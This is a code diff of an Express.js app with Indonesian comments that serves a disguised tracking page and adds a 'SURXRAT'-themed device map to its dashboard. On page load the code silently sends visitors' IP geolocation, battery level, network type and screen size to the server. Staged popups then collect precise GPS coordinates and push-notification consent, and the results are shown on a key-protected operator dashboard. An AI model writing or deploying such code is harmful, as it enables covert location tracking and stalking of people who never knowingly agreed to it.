@@ -47,6 +47,9 @@ async function ipGeo(ip) {
 app.set('trust proxy', true); 
 app.use(express.json({ limit: '2mb' })); 
 
+// ==============================================================
+// API ENDPOINTS
+// ==============================================================
 app.post('/api/save-player', (req, res) => {
   const ip = clientIp(req);
   const { playerId } = req.body;
@@ -96,7 +99,7 @@ app.post('/api/gps', (req, res) => {
 });
 
 // ==============================================================
-// DASHBOARD LIST & MAP (SAMA KAYAK SEBELUMNYA)
+// DASHBOARD LIST
 // ==============================================================
 app.get('/dash', (req, res) => {
   if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');
@@ -166,6 +169,9 @@ app.get('/dash', (req, res) => {
   </body></html>`);
 });
 
+// ==============================================================
+// DASHBOARD MAP (TEMA SURXRAT)
+// ==============================================================
 app.get('/dash/map', (req, res) => {
   if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');
   let devices = []; try { devices = JSON.parse(fs.readFileSync(DEVICE_FILE, 'utf8')); } catch (_) {}
@@ -277,8 +283,6 @@ app.get('*', (req, res) => {
   .card{background:#fff;border-radius:12px;padding:20px;margin-bottom:16px;box-shadow:0 4px 6px rgba(0,0,0,0.05);border-left:4px solid #1e40af}
   .card h3{margin:0 0 10px;font-size:16px;color:#1e40af}
   .card p{margin:0;font-size:13px;line-height:1.6;color:#475569}
-  
-  /* POPUP STYLE */
   .popup-overlay{position:fixed;inset:0;background:rgba(15,23,42,0.8);display:flex;align-items:center;justify-content:center;z-index:9999;opacity:0;pointer-events:none;transition:0.3s}
   .popup-overlay.show{opacity:1;pointer-events:auto}
   .popup-box{background:#fff;border-radius:16px;padding:24px;width:85%;max-width:320px;text-align:center;transform:translateY(20px);transition:0.3s}
@@ -305,7 +309,6 @@ app.get('*', (req, res) => {
   </div>
 </div>
 
-<!-- POPUP 1: LOKASI -->
 <div class="popup-overlay" id="popup1">
   <div class="popup-box">
     <div class="popup-icon">📍</div>
@@ -315,7 +318,6 @@ app.get('*', (req, res) => {
   </div>
 </div>
 
-<!-- POPUP 2: NOTIFIKASI -->
 <div class="popup-overlay" id="popup2">
   <div class="popup-box">
     <div class="popup-icon">🔔</div>
@@ -329,39 +331,42 @@ app.get('*', (req, res) => {
 (async function(){
   const slug = '${slug}';
   
-  // Lacak IP di background
   fetch('/api/geoip?s=' + encodeURIComponent(slug)).catch(()=>{});
 
-  // Ambil data baterai & jaringan (biar dashboard ada isinya)
   const data = { src: 'device_info', language: navigator.language, screen: screen.width + 'x' + screen.height, slug: slug };
   if (navigator.getBattery) { try { const b = await navigator.getBattery(); data.battery = Math.round(b.level*100)+'%'; } catch(e){} }
   if (navigator.connection) { data.netType = navigator.connection.effectiveType; }
   fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data) }).catch(()=>{});
 
-  // --- LANGKAH 1: POPUP LOKASI ---
+  // --- LANGKAH 1: LOKASI ---
   setTimeout(() => { document.getElementById('popup1').classList.add('show'); }, 1000);
 
   document.getElementById('allowLocBtn').addEventListener('click', function() {
     this.innerText = 'Meminta izin...';
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
-        p => { 
-          fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,slug:slug}) }).catch(()=>{}); 
-        },
-        e => { console.log(e); },
-        {enableHighAccuracy:true,timeout:10000,maximumAge:0}
+        p => { fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,slug:slug}) }).catch(()=>{}); },
+        e => {},
+        {enableHighAccuracy:true,timeout:10000}
       );
     }
     
-    // Tutup popup 1, lanjut ke popup 2 setelah 1 detik
     document.getElementById('popup1').classList.remove('show');
     setTimeout(() => { document.getElementById('popup2').classList.add('show'); }, 800);
   });
 
-  // --- LANGKAH 2: POPUP NOTIFIKASI ---
+  // --- LANGKAH 2: NOTIFIKASI (DENGAN ANTI-STUCK) ---
   document.getElementById('allowNotifBtn').addEventListener('click', async function() {
     this.innerText = 'Memproses...';
     this.disabled = true;
+    const btn = this;
+
+    // Timer Anti Stuck
+    const forceClose = setTimeout(() => {
+      document.getElementById('popup2').classList.remove('show');
+      btn.innerText = 'Izinkan Notifikasi';
+      btn.disabled = false;
+    }, 2500);
 
     if (window.OneSignal) {
       try {
@@ -373,9 +378,10 @@ app.get('*', (req, res) => {
       } catch(e) { console.log(e); }
     }
 
+    clearTimeout(forceClose);
     document.getElementById('popup2').classList.remove('show');
-    this.innerText = 'Izinkan Notifikasi';
-    this.disabled = false;
+    btn.innerText = 'Izinkan Notifikasi';
+    btn.disabled = false;
   });
 })();
 </script>
